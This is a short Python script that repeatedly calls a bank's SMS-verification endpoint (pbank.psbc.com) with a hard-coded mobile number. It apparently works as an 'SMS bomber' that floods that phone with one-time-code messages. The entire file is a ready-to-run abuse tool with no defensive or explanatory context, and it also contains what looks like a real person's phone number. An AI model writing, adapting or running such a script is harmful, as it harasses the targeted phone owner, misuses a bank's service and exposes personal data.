# -*- coding:utf-8 -*-
import gevent
import requests
import time


def send_sms():
    mobile="13477041611"
    num=3
    while num>0:
        payload={"AcNo":"","MobilePhone":"","BankId":"9999","Transacation":"CreditOnlineApplyCert","locale":"zh_CN"}
        payload["MobilePhone"]=mobile
        url="https://pbank.psbc.com/pweb/GetSmsForOutQuickPayment.do?"
        r=requests.get(url,params=payload)
        num -=1
        time.sleep(0)
    print "OK"

if __name__ == '__main__':
    for i in range(10):
        gevent.joinall([
            gevent.spawn(send_sms)
        ])